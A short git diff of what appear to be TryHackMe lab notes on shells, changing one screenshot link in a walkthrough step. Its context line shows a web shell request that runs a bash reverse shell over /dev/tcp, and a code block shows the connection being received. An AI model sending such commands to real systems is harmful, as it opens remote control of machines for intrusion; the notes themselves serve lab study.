@@ -514,7 +514,7 @@ http://10.114.157.52:8082/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/1
 
 **Step 7 — Shell Received on Attacker Terminal**
 
-![Web shell reverse shell connection received - www-data prompt](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task3.png)
+![Web shell reverse shell connection received - www-data prompt](https://github.com/alimirza2412/Tryhackme-notes/blob/b20006e1d0f90645221fecc665e1c3b56aa85d9f/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%204.png)
 
 ```
 Connection received on 10.114.157.52 XXXXX ✅
